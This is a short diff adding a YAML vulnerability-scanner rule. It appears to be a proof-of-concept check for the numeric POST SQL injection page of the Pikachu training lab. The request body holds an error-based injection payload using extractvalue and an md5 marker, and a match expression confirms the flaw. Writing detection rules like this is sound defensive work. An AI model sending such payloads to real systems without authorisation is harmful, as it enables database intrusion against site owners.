@@ -1,0 +1,11 @@
+name: sql-number-pikachu-post
+type: SQLI
+rules:
+  - method: POST
+    path: vul/sqli/sqli_id.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Content-type: application/x-www-form-urlencoded
+    body: id=1 and extractvalue(1,concat(0x3a,md5(99999999)))#&submit=%E6%9F%A5%E8%AF%A2
+    expression: result.contains("ef775988943825d2871e1cfa75473ec")
+author: ch4ser
